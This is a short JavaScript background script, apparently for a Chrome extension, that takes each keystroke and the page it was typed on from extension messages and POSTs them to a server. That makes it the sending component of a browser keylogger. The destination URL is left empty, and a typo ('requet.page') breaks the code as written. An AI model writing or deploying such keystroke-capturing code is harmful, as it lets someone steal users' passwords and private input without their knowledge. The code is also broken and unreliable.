function handleMessage(request){
    //alerts that give us direct output of the key pressed and which page we are currently on
    //alert(request.key);
    //alert(request.page);

    data = "key="+request.key+"&page="+requet.page;

    //key=g&page=google.com <-- query srting

    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
        alert(this.responseText);
    }

    xhr.open("POST","",true);
    xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    xhr.send(data);
}



chrome.runtime.onMessage.addListener(handleMessage);